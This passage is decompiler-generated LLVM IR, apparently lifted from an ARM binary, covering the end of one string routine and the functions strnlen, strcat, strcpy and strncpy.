  %v2_14334 = icmp eq i8 %v0_14334.in, 0
  br i1 %v2_14334, label %dec_label_pc_143d0, label %dec_label_pc_1433c

dec_label_pc_1433c:                               ; preds = %dec_label_pc_14334
  %v1_1433c = add i32 %v0_1433c, 1
  %v2_1433c = inttoptr i32 %v1_1433c to i8*
  %v3_1433c = load i8, i8* %v2_1433c, align 1
  store i32 %v1_1433c, i32* %r0.global-to-local, align 4
  %v9_14340 = icmp eq i8 %v3_1433c, %v3_142e4
  br i1 %v9_14340, label %dec_label_pc_1435c, label %dec_label_pc_14348

dec_label_pc_14348:                               ; preds = %dec_label_pc_1433c
  %v2_14348 = icmp eq i8 %v3_1433c, 0
  br i1 %v2_14348, label %dec_label_pc_143d0, label %dec_label_pc_14350

dec_label_pc_14350:                               ; preds = %dec_label_pc_14348
  %v1_14350 = add i32 %v0_1433c, 2
  %v2_14350 = inttoptr i32 %v1_14350 to i8*
  %v3_14350 = load i8, i8* %v2_14350, align 1
  store i32 %v1_14350, i32* %r0.global-to-local, align 4
  %v9_14354 = icmp eq i8 %v3_14350, %v3_142e4
  br i1 %v9_14354, label %dec_label_pc_1435c, label %dec_label_pc_14334

dec_label_pc_1435c:                               ; preds = %dec_label_pc_1433c, %dec_label_pc_14350, %dec_label_pc_14354.preheader
  %v0_1435c = phi i32 [ %storemerge41, %dec_label_pc_14354.preheader ], [ %v1_1433c, %dec_label_pc_1433c ], [ %v1_14350, %dec_label_pc_14350 ]
  %v1_1435c = add i32 %v0_1435c, 1
  br label %dec_label_pc_14364

dec_label_pc_14364:                               ; preds = %dec_label_pc_14318, %dec_label_pc_1435c
  %storemerge41 = phi i32 [ %v1_1435c, %dec_label_pc_1435c ], [ %v1_14318, %dec_label_pc_14318 ]
  %v3_1435c.pn.in = inttoptr i32 %storemerge41 to i8*
  %v3_1435c.pn = load i8, i8* %v3_1435c.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  %storemerge = icmp eq i8 %v3_1435c.pn, %v4_14308
  br i1 %storemerge, label %dec_label_pc_14368, label %dec_label_pc_14354.preheader

dec_label_pc_14368:                               ; preds = %dec_label_pc_14364
  %v1_14368 = add i32 %storemerge41, 1
  %v2_14368 = inttoptr i32 %v1_14368 to i8*
  %v3_14368 = load i8, i8* %v2_14368, align 1
  %v4_14368 = zext i8 %v3_14368 to i32
  %v3_1436c = load i8, i8* %v2_1436c, align 1
  %v4_1436c = zext i8 %v3_1436c to i32
  %v9_14374 = icmp eq i8 %v3_14368, %v3_1436c
  %v1_1437c = add i32 %storemerge41, -1
  store i32 %v1_1437c, i32* %r0.global-to-local, align 4
  br i1 %v9_14374, label %dec_label_pc_14384, label %dec_label_pc_143c4

dec_label_pc_14384:                               ; preds = %dec_label_pc_14368, %dec_label_pc_143b4
  %v0_1439c = phi i32 [ %v1_143a4, %dec_label_pc_143b4 ], [ %v1_1436c, %dec_label_pc_14368 ]
  %v0_14394 = phi i32 [ %v1_143a0, %dec_label_pc_143b4 ], [ %v1_14368, %dec_label_pc_14368 ]
  %v0_14384 = phi i32 [ %v4_143b4, %dec_label_pc_143b4 ], [ %v4_14368, %dec_label_pc_14368 ]
  %v2_14384 = icmp eq i32 %v0_14384, 0
  br i1 %v2_14384, label %dec_label_pc_143d4, label %dec_label_pc_1438c

dec_label_pc_1438c:                               ; preds = %dec_label_pc_14384
  %v1_1438c = add i32 %v0_14394, 1
  %v2_1438c = inttoptr i32 %v1_1438c to i8*
  %v3_1438c = load i8, i8* %v2_1438c, align 1
  %v1_14390 = add i32 %v0_1439c, 1
  %v2_14390 = inttoptr i32 %v1_14390 to i8*
  %v3_14390 = load i8, i8* %v2_14390, align 1
  %v4_14390 = zext i8 %v3_14390 to i32
  store i32 %v1_1438c, i32* @r1, align 4
  %v9_14398 = icmp eq i8 %v3_1438c, %v3_14390
  %v1_143a0 = add i32 %v0_14394, 2
  %v1_143a4 = add i32 %v0_1439c, 2
  br i1 %v9_14398, label %dec_label_pc_143ac, label %dec_label_pc_143c4

dec_label_pc_143ac:                               ; preds = %dec_label_pc_1438c
  %v2_143ac = icmp eq i8 %v3_1438c, 0
  br i1 %v2_143ac, label %dec_label_pc_143d4, label %dec_label_pc_143b4

dec_label_pc_143b4:                               ; preds = %dec_label_pc_143ac
  %v2_143b4 = inttoptr i32 %v1_143a4 to i8*
  %v3_143b4 = load i8, i8* %v2_143b4, align 1
  %v4_143b4 = zext i8 %v3_143b4 to i32
  %v2_143b8 = inttoptr i32 %v1_143a0 to i8*
  %v3_143b8 = load i8, i8* %v2_143b8, align 1
  %v9_143bc = icmp eq i8 %v3_143b8, %v3_143b4
  br i1 %v9_143bc, label %dec_label_pc_14384, label %dec_label_pc_143c4

dec_label_pc_143c4:                               ; preds = %dec_label_pc_143b4, %dec_label_pc_1438c, %dec_label_pc_14368
  %v0_143c4 = phi i32 [ %v4_1436c, %dec_label_pc_14368 ], [ %v4_143b4, %dec_label_pc_143b4 ], [ %v4_14390, %dec_label_pc_1438c ]
  %v2_143c4 = icmp eq i32 %v0_143c4, 0
  br i1 %v2_143c4, label %dec_label_pc_143d4, label %dec_label_pc_14328

dec_label_pc_143d0:                               ; preds = %dec_label_pc_142f4, %dec_label_pc_14348, %dec_label_pc_14334
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_143d4

dec_label_pc_143d4:                               ; preds = %dec_label_pc_143c4, %dec_label_pc_143ac, %dec_label_pc_14384, %entry, %dec_label_pc_14308, %dec_label_pc_143d0
  %v1_143d8 = phi i32 [ %v1_142f4, %dec_label_pc_14308 ], [ 0, %dec_label_pc_143d0 ], [ %v1_143d8.pre, %entry ], [ %v1_1437c, %dec_label_pc_14384 ], [ %v1_1437c, %dec_label_pc_143ac ], [ %v1_1437c, %dec_label_pc_143c4 ]
  ret i32 %v1_143d8

; uselistorder directives
  uselistorder i32 %v1_143a0, { 1, 0 }
  uselistorder i8 %v3_1435c.pn, { 1, 0 }
  uselistorder i8* %v3_1435c.pn.in, { 1, 0 }
  uselistorder i32 %storemerge41, { 3, 2, 6, 1, 4, 0, 5 }
  uselistorder i8 %v3_14350, { 1, 0 }
  uselistorder i32 %v1_14350, { 0, 2, 3, 1 }
  uselistorder i32 %v1_142f4, { 0, 2, 3, 1 }
  uselistorder i8 %v3_142e4, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 2, 6, 7, 4, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_143d4, { 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_143d0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14384, { 1, 0 }
  uselistorder label %dec_label_pc_14364, { 1, 0 }
  uselistorder label %dec_label_pc_1435c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14334, { 1, 0 }
  uselistorder label %dec_label_pc_14354.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_143dc = icmp eq i32 %arg2, 0
  br i1 %v2_143dc, label %bb, label %dec_label_pc_143f0

bb:                                               ; preds = %entry
  br label %bb25

dec_label_pc_143f0:                               ; preds = %entry
  %v2_143f0 = add i32 %tmp, %arg2
  %v3_143f0 = icmp ult i32 %v2_143f0, %tmp
  br i1 %v3_143f0, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_143f0
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_143f0, %bb19
  %v5_14490 = phi i32 [ %v2_143f0, %dec_label_pc_143f0 ], [ -1, %bb19 ]
  %v1_144104 = urem i32 %tmp, 4
  %v2_144105 = icmp eq i32 %v1_144104, 0
  br i1 %v2_144105, label %dec_label_pc_14418, label %dec_label_pc_14400

dec_label_pc_14400:                               ; preds = %bb20, %dec_label_pc_1440c
  %v0_1440c = phi i32 [ %v1_1440c, %dec_label_pc_1440c ], [ %tmp, %bb20 ]
  %v1_14400 = inttoptr i32 %v0_1440c to i8*
  %v2_14400 = load i8, i8* %v1_14400, align 1
  %v2_14404 = icmp eq i8 %v2_14400, 0
  br i1 %v2_14404, label %dec_label_pc_1448c, label %dec_label_pc_1440c

dec_label_pc_1440c:                               ; preds = %dec_label_pc_14400
  %v1_1440c = add i32 %v0_1440c, 1
  %v1_14410 = urem i32 %v1_1440c, 4
  %v2_14410 = icmp eq i32 %v1_14410, 0
  br i1 %v2_14410, label %dec_label_pc_14418, label %dec_label_pc_14400

dec_label_pc_14418:                               ; preds = %dec_label_pc_1440c, %bb20
  %storemerge.lcssa = phi i32 [ %tmp, %bb20 ], [ %v1_1440c, %dec_label_pc_1440c ]
  %v3_1447c30 = icmp ult i32 %storemerge.lcssa, %v5_14490
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_1447c30, label %dec_label_pc_14420, label %dec_label_pc_1448c

dec_label_pc_14420:                               ; preds = %dec_label_pc_14478, %dec_label_pc_14418
  %v0_1447037 = phi i32 [ %v4_14420, %dec_label_pc_14478 ], [ %storemerge.lcssa, %dec_label_pc_14418 ]
  %v1_14420 = inttoptr i32 %v0_1447037 to i32*
  %v2_14420 = load i32, i32* %v1_14420, align 4
  %v4_14420 = add i32 %v0_1447037, 4
  %v2_14424 = add i32 %v2_14420, -16843009
  %v2_14428 = and i32 %v2_14424, -2139062144
  store i32 %v2_14428, i32* @ip, align 4
  %v2_1442c = icmp eq i32 %v2_14428, 0
  br i1 %v2_1442c, label %dec_label_pc_14478, label %dec_label_pc_14434

dec_label_pc_14434:                               ; preds = %dec_label_pc_14420
  %v2_14434 = inttoptr i32 %v0_1447037 to i8*
  %v3_14434 = load i8, i8* %v2_14434, align 1
  %v2_14438 = icmp eq i8 %v3_14434, 0
  br i1 %v2_14438, label %bb21, label %dec_label_pc_14448

bb21:                                             ; preds = %dec_label_pc_14434
  br label %dec_label_pc_1448c

dec_label_pc_14448:                               ; preds = %dec_label_pc_14434
  %v1_14448 = add i32 %v0_1447037, 1
  %v2_14448 = inttoptr i32 %v1_14448 to i8*
  %v3_14448 = load i8, i8* %v2_14448, align 1
  %v2_1444c = icmp eq i8 %v3_14448, 0
  br i1 %v2_1444c, label %dec_label_pc_1448c, label %dec_label_pc_14458

dec_label_pc_14458:                               ; preds = %dec_label_pc_14448
  %v1_14458 = add i32 %v0_1447037, 2
  %v2_14458 = inttoptr i32 %v1_14458 to i8*
  %v3_14458 = load i8, i8* %v2_14458, align 1
  %v2_1445c = icmp eq i8 %v3_14458, 0
  br i1 %v2_1445c, label %dec_label_pc_1448c, label %dec_label_pc_14468

dec_label_pc_14468:                               ; preds = %dec_label_pc_14458
  %v1_14468 = add i32 %v0_1447037, 3
  %v2_14468 = inttoptr i32 %v1_14468 to i8*
  %v3_14468 = load i8, i8* %v2_14468, align 1
  %v2_1446c = icmp eq i8 %v3_14468, 0
  br i1 %v2_1446c, label %dec_label_pc_1448c, label %dec_label_pc_14478

dec_label_pc_14478:                               ; preds = %dec_label_pc_14468, %dec_label_pc_14420
  %v3_1447c = icmp ult i32 %v4_14420, %v5_14490
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_1447c, label %dec_label_pc_14420, label %dec_label_pc_1448c

dec_label_pc_1448c:                               ; preds = %dec_label_pc_14478, %dec_label_pc_14418, %dec_label_pc_14400, %dec_label_pc_14448, %dec_label_pc_14458, %dec_label_pc_14468, %bb21
  %v1_1448c = phi i32 [ %v0_1447037, %bb21 ], [ %storemerge.lcssa, %dec_label_pc_14418 ], [ %v1_14448, %dec_label_pc_14448 ], [ %v1_14458, %dec_label_pc_14458 ], [ %v1_14468, %dec_label_pc_14468 ], [ %v5_14490, %dec_label_pc_14478 ], [ %v0_1440c, %dec_label_pc_14400 ]
  %v3_1448c = icmp uge i32 %v5_14490, %v1_1448c
  %v9_1448c = icmp eq i32 %v5_14490, %v1_1448c
  %v2_14490 = xor i1 %v3_1448c, true
  %v3_14490 = or i1 %v9_1448c, %v2_14490
  br i1 %v3_14490, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_1448c
  %v6_14490 = sub i32 %v5_14490, %tmp
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_1448c, %bb22
  %v5_14494 = phi i32 [ %v1_1448c, %dec_label_pc_1448c ], [ %v6_14490, %bb22 ]
  %v2_14494 = xor i1 %v9_1448c, true
  %v3_14494 = and i1 %v3_1448c, %v2_14494
  br i1 %v3_14494, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  %v6_14494 = sub i32 %v5_14494, %tmp
  br label %bb25

bb25:                                             ; preds = %bb, %bb23, %bb24
  %v1_1449c = phi i32 [ 0, %bb ], [ %v5_14494, %bb23 ], [ %v6_14494, %bb24 ]
  ret i32 %v1_1449c

; uselistorder directives
  uselistorder i1 %v3_1448c, { 1, 0 }
  uselistorder i32 %v4_14420, { 1, 0 }
  uselistorder i32 %v0_1447037, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_1440c, { 1, 0, 2 }
  uselistorder i32 %v5_14490, { 3, 4, 5, 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 1, 3, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 2, 1, 0 }
  uselistorder label %bb25, { 2, 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_1448c, { 0, 5, 4, 3, 6, 1, 2 }
  uselistorder label %dec_label_pc_14400, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_144ac

dec_label_pc_144ac:                               ; preds = %dec_label_pc_144ac, %entry
  %v0_144ac = phi i32 [ %v5_144ac, %dec_label_pc_144ac ], [ %tmp, %entry ]
  %v1_144ac = inttoptr i32 %v0_144ac to i8*
  %v2_144ac = load i8, i8* %v1_144ac, align 1
  %v5_144ac = add i32 %v0_144ac, 1
  store i32 %v5_144ac, i32* %r2.global-to-local, align 4
  %v2_144b0 = icmp eq i8 %v2_144ac, 0
  store i1 %v2_144b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_144b0, label %dec_label_pc_144b8, label %dec_label_pc_144ac

dec_label_pc_144b8:                               ; preds = %dec_label_pc_144ac
  %v1_144b8 = add i32 %v0_144ac, -1
  store i32 %v1_144b8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_144bc

dec_label_pc_144bc:                               ; preds = %dec_label_pc_144bc, %dec_label_pc_144b8
  %v2_144c4 = phi i32 [ %v6_144c4, %dec_label_pc_144bc ], [ %v1_144b8, %dec_label_pc_144b8 ]
  %v0_144bc = load i32, i32* @r1, align 4
  %v1_144bc = inttoptr i32 %v0_144bc to i8*
  %v2_144bc = load i8, i8* %v1_144bc, align 1
  %v5_144bc = add i32 %v0_144bc, 1
  store i32 %v5_144bc, i32* @r1, align 4
  %v2_144c0 = icmp eq i8 %v2_144bc, 0
  store i1 %v2_144c0, i1* %cpsr_z.global-to-local, align 1
  %v3_144c4 = add i32 %v2_144c4, 1
  %v4_144c4 = inttoptr i32 %v3_144c4 to i8*
  store i8 %v2_144bc, i8* %v4_144c4, align 1
  %v5_144c4 = load i32, i32* %r2.global-to-local, align 4
  %v6_144c4 = add i32 %v5_144c4, 1
  store i32 %v6_144c4, i32* %r2.global-to-local, align 4
  %v0_144c8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_144c8, label %dec_label_pc_144cc, label %dec_label_pc_144bc

dec_label_pc_144cc:                               ; preds = %dec_label_pc_144bc
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_144c4, { 1, 0 }
  uselistorder i32 %v5_144ac, { 1, 0 }
  uselistorder i32 %v0_144ac, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_144e01 = load i32, i32* @r1, align 4
  %v1_144e02 = inttoptr i32 %v0_144e01 to i8*
  %v2_144e03 = load i8, i8* %v1_144e02, align 1
  %v2_144e45 = icmp eq i8 %v2_144e03, 0
  store i1 %v2_144e45, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_144e03, i8* %arg1, align 1
  br i1 %v2_144e45, label %dec_label_pc_144f0, label %dec_label_pc_144d8

dec_label_pc_144d8:                               ; preds = %entry, %dec_label_pc_144d8
  %v0_144d8 = load i32, i32* @r1, align 4
  %v1_144d8 = add i32 %v0_144d8, 1
  store i32 %v1_144d8, i32* @r1, align 4
  %v0_144dc = load i32, i32* %r2.global-to-local, align 4
  %v1_144dc = add i32 %v0_144dc, 1
  store i32 %v1_144dc, i32* %r2.global-to-local, align 4
  %v1_144e0 = inttoptr i32 %v1_144d8 to i8*
  %v2_144e0 = load i8, i8* %v1_144e0, align 1
  %v2_144e4 = icmp eq i8 %v2_144e0, 0
  store i1 %v2_144e4, i1* %cpsr_z.global-to-local, align 1
  %v3_144e8 = inttoptr i32 %v1_144dc to i8*
  store i8 %v2_144e0, i8* %v3_144e8, align 1
  %v0_144ec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_144ec, label %dec_label_pc_144f0, label %dec_label_pc_144d8

dec_label_pc_144f0:                               ; preds = %dec_label_pc_144d8, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_144d8, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v7_144f4 = icmp eq i32 %arg2, 3
  store i1 %v7_144f4, i1* %cpsr_z.global-to-local, align 1
  %v0_144f8 = load i32, i32* @lr, align 4
  store i32 %v0_144f8, i32* %stack_var_-4, align 4
  %v1_144fc = add i32 %arg1, -1
  store i32 %v1_144fc, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_14578, label %dec_label_pc_14504

dec_label_pc_14504:                               ; preds = %entry
  %v3_14504 = udiv i32 %arg2, 4
  store i32 %v3_14504, i32* %lr.global-to-local, align 4
  %v0_14508.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_14508

dec_label_pc_14508:                               ; preds = %dec_label_pc_14554, %dec_label_pc_14504
  %v2_14510 = phi i32 [ %v6_14548, %dec_label_pc_14554 ], [ %v1_144fc, %dec_label_pc_14504 ]
  %v0_14508 = phi i32 [ %v1_14558, %dec_label_pc_14554 ], [ %v0_14508.pre, %dec_label_pc_14504 ]
  %v1_14508 = inttoptr i32 %v0_14508 to i8*
  %v2_14508 = load i8, i8* %v1_14508, align 1
  %v3_14508 = zext i8 %v2_14508 to i32
  store i32 %v3_14508, i32* %r3.global-to-local, align 4
  %v2_1450c = icmp eq i8 %v2_14508, 0
  store i1 %v2_1450c, i1* %cpsr_z.global-to-local, align 1
  %v3_14510 = add i32 %v2_14510, 1
  %v4_14510 = inttoptr i32 %v3_14510 to i8*
  store i8 %v2_14508, i8* %v4_14510, align 1
  %v5_14510 = load i32, i32* @ip, align 4
  %v6_14510 = add i32 %v5_14510, 1
  store i32 %v6_14510, i32* @ip, align 4
  %v0_14514 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14514, label %dec_label_pc_14564, label %dec_label_pc_14518

dec_label_pc_14518:                               ; preds = %dec_label_pc_14508
  %v0_14518 = load i32, i32* @r1, align 4
  %v1_14518 = add i32 %v0_14518, 1
  %v2_14518 = inttoptr i32 %v1_14518 to i8*
  %v3_14518 = load i8, i8* %v2_14518, align 1
  %v4_14518 = zext i8 %v3_14518 to i32
  store i32 %v4_14518, i32* %r3.global-to-local, align 4
  %v2_1451c = icmp eq i8 %v3_14518, 0
  store i1 %v2_1451c, i1* %cpsr_z.global-to-local, align 1
  %v3_14520 = add i32 %v5_14510, 2
  %v4_14520 = inttoptr i32 %v3_14520 to i8*
  store i8 %v3_14518, i8* %v4_14520, align 1
  %v5_14520 = load i32, i32* @ip, align 4
  %v6_14520 = add i32 %v5_14520, 1
  store i32 %v6_14520, i32* @ip, align 4
  %v0_14524 = load i32, i32* @r1, align 4
  %v1_14524 = add i32 %v0_14524, 1
  store i32 %v1_14524, i32* %r1.global-to-local, align 4
  %v0_14528 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14528, label %dec_label_pc_14564, label %dec_label_pc_1452c

dec_label_pc_1452c:                               ; preds = %dec_label_pc_14518
  %v1_1452c = add i32 %v0_14524, 2
  %v2_1452c = inttoptr i32 %v1_1452c to i8*
  %v3_1452c = load i8, i8* %v2_1452c, align 1
  %v4_1452c = zext i8 %v3_1452c to i32
  store i32 %v4_1452c, i32* %r3.global-to-local, align 4
  %v2_14530 = icmp eq i8 %v3_1452c, 0
  store i1 %v2_14530, i1* %cpsr_z.global-to-local, align 1
  %v3_14534 = add i32 %v5_14520, 2
  %v4_14534 = inttoptr i32 %v3_14534 to i8*
  store i8 %v3_1452c, i8* %v4_14534, align 1
  %v5_14534 = load i32, i32* @ip, align 4
  %v6_14534 = add i32 %v5_14534, 1
  store i32 %v6_14534, i32* @ip, align 4
  %v0_14538 = load i32, i32* %r1.global-to-local, align 4
  %v1_14538 = add i32 %v0_14538, 1
  store i32 %v1_14538, i32* %r1.global-to-local, align 4
  %v0_1453c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1453c, label %dec_label_pc_14564, label %dec_label_pc_14540

dec_label_pc_14540:                               ; preds = %dec_label_pc_1452c
  %v1_14540 = add i32 %v0_14538, 2
  %v2_14540 = inttoptr i32 %v1_14540 to i8*
  %v3_14540 = load i8, i8* %v2_14540, align 1
  %v4_14540 = zext i8 %v3_14540 to i32
  store i32 %v4_14540, i32* %r3.global-to-local, align 4
  %v2_14544 = icmp eq i8 %v3_14540, 0
  store i1 %v2_14544, i1* %cpsr_z.global-to-local, align 1
  %v3_14548 = add i32 %v5_14534, 2
  %v4_14548 = inttoptr i32 %v3_14548 to i8*
  store i8 %v3_14540, i8* %v4_14548, align 1
  %v5_14548 = load i32, i32* @ip, align 4
  %v6_14548 = add i32 %v5_14548, 1
  store i32 %v6_14548, i32* @ip, align 4
  %v0_1454c = load i32, i32* %r1.global-to-local, align 4
  %v1_1454c = add i32 %v0_1454c, 1
  store i32 %v1_1454c, i32* %r1.global-to-local, align 4
  %v0_14550 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14550, label %dec_label_pc_14564, label %dec_label_pc_14554

dec_label_pc_14554:                               ; preds = %dec_label_pc_14540
  %v0_14554 = load i32, i32* %lr.global-to-local, align 4
  %v1_14554 = add i32 %v0_14554, -1
  store i32 %v1_14554, i32* %lr.global-to-local, align 4
  %v7_14554 = icmp eq i32 %v0_14554, 1
  store i1 %v7_14554, i1* %cpsr_z.global-to-local, align 1
  %v1_14558 = add i32 %v0_1454c, 2
  store i32 %v1_14558, i32* @r1, align 4
  br i1 %v7_14554, label %dec_label_pc_14578, label %dec_label_pc_14508

dec_label_pc_14564:                               ; preds = %dec_label_pc_14540, %dec_label_pc_1452c, %dec_label_pc_14518, %dec_label_pc_14508
  %v1_14564 = phi i32 [ %v6_14548, %dec_label_pc_14540 ], [ %v6_14534, %dec_label_pc_1452c ], [ %v6_14520, %dec_label_pc_14518 ], [ %v6_14510, %dec_label_pc_14508 ]
  %v2_145641 = sub i32 %arg1, %v1_14564
  %v2_14568 = add i32 %v2_145641, %arg2
  %v1_1456c = add i32 %v2_14568, -1
  store i32 %v1_1456c, i32* %r3.global-to-local, align 4
  %v7_1456c = icmp eq i32 %v2_14568, 1
  store i1 %v7_1456c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1456c, label %dec_label_pc_145a8, label %dec_label_pc_14598

dec_label_pc_14578:                               ; preds = %dec_label_pc_14554, %entry
  %v2_145887 = phi i32 [ %v1_144fc, %entry ], [ %v6_14548, %dec_label_pc_14554 ]
  %v1_14578 = urem i32 %arg2, 4
  store i32 %v1_14578, i32* %r3.global-to-local, align 4
  %v2_14578 = icmp eq i32 %v1_14578, 0
  store i1 %v2_14578, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14578, label %dec_label_pc_145a8, label %dec_label_pc_14580

dec_label_pc_14580:                               ; preds = %dec_label_pc_14578, %dec_label_pc_14590.dec_label_pc_14580_crit_edge
  %v2_14588 = phi i32 [ %v6_14588, %dec_label_pc_14590.dec_label_pc_14580_crit_edge ], [ %v2_145887, %dec_label_pc_14578 ]
  %v0_14584 = phi i32 [ %v0_14584.pre, %dec_label_pc_14590.dec_label_pc_14580_crit_edge ], [ %v1_14578, %dec_label_pc_14578 ]
  %v0_14580 = load i32, i32* @r1, align 4
  %v1_14580 = inttoptr i32 %v0_14580 to i8*
  %v2_14580 = load i8, i8* %v1_14580, align 1
  %v3_14580 = zext i8 %v2_14580 to i32
  store i32 %v3_14580, i32* %r2.global-to-local, align 4
  %v5_14580 = add i32 %v0_14580, 1
  store i32 %v5_14580, i32* @r1, align 4
  %v1_14584 = add i32 %v0_14584, -1
  store i32 %v1_14584, i32* %r3.global-to-local, align 4
  %v7_14584 = icmp eq i32 %v0_14584, 1
  store i1 %v7_14584, i1* %cpsr_z.global-to-local, align 1
  %v3_14588 = add i32 %v2_14588, 1
  %v4_14588 = inttoptr i32 %v3_14588 to i8*
  store i8 %v2_14580, i8* %v4_14588, align 1
  %v5_14588 = load i32, i32* @ip, align 4
  %v6_14588 = add i32 %v5_14588, 1
  store i32 %v6_14588, i32* @ip, align 4
  %v0_1458c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1458c, label %dec_label_pc_145a8, label %dec_label_pc_14590

dec_label_pc_14590:                               ; preds = %dec_label_pc_14580
  %v0_14590 = load i32, i32* %r2.global-to-local, align 4
  %v2_14590 = icmp eq i32 %v0_14590, 0
  store i1 %v2_14590, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14590, label %dec_label_pc_14598, label %dec_label_pc_14590.dec_label_pc_14580_crit_edge

dec_label_pc_14590.dec_label_pc_14580_crit_edge:  ; preds = %dec_label_pc_14590
  %v0_14584.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14580

dec_label_pc_14598:                               ; preds = %dec_label_pc_14590, %dec_label_pc_14564
  %v2_145a010 = phi i32 [ %v1_14564, %dec_label_pc_14564 ], [ %v6_14588, %dec_label_pc_14590 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1459c

dec_label_pc_1459c:                               ; preds = %dec_label_pc_1459c.dec_label_pc_1459c_crit_edge, %dec_label_pc_14598
  %v2_145a0 = phi i32 [ %v6_145a0, %dec_label_pc_1459c.dec_label_pc_1459c_crit_edge ], [ %v2_145a010, %dec_label_pc_14598 ]
  %v0_145a0.off0 = phi i8 [ %extract.t, %dec_label_pc_1459c.dec_label_pc_1459c_crit_edge ], [ 0, %dec_label_pc_14598 ]
  %v0_1459c = load i32, i32* %r3.global-to-local, align 4
  %v1_1459c = add i32 %v0_1459c, -1
  store i32 %v1_1459c, i32* %r3.global-to-local, align 4
  %v7_1459c = icmp eq i32 %v0_1459c, 1
  store i1 %v7_1459c, i1* %cpsr_z.global-to-local, align 1
  %v3_145a0 = add i32 %v2_145a0, 1
  %v4_145a0 = inttoptr i32 %v3_145a0 to i8*
  store i8 %v0_145a0.off0, i8* %v4_145a0, align 1
  %v5_145a0 = load i32, i32* @ip, align 4
  %v6_145a0 = add i32 %v5_145a0, 1
  store i32 %v6_145a0, i32* @ip, align 4
  %v0_145a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_145a4, label %dec_label_pc_145a8, label %dec_label_pc_1459c.dec_label_pc_1459c_crit_edge

dec_label_pc_1459c.dec_label_pc_1459c_crit_edge:  ; preds = %dec_label_pc_1459c
  %v0_145a0.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_145a0.pre to i8
  br label %dec_label_pc_1459c

dec_label_pc_145a8:                               ; preds = %dec_label_pc_14580, %dec_label_pc_1459c, %dec_label_pc_14564, %dec_label_pc_14578
  %v2_145a8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_145a8, i32* @lr, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_145a0, { 1, 0 }
  uselistorder i32 %v0_1459c, { 1, 0 }
  uselistorder i32 %v6_14588, { 0, 2, 1 }
  uselistorder i32 %v1_14578, { 2, 1, 0 }
  uselistorder i32 %v2_14568, { 1, 0 }
  uselistorder i32 %v1_14558, { 1, 0 }
  uselistorder i32 %v0_14554, { 1, 0 }
  uselistorder i32 %v6_14548, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
